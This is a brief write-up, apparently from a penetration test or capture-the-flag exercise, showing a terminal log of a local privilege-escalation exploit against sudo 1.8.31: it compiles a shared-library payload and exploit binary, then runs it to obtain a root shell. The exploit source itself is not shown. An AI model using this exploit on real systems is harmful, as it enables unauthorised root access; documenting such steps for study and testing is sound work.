# sudo - version 1.8.31 Privilege Escalation

```bash
anita@web01:/tmp$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c


anita@web01:/tmp$ ./exploit
#
```

[image]
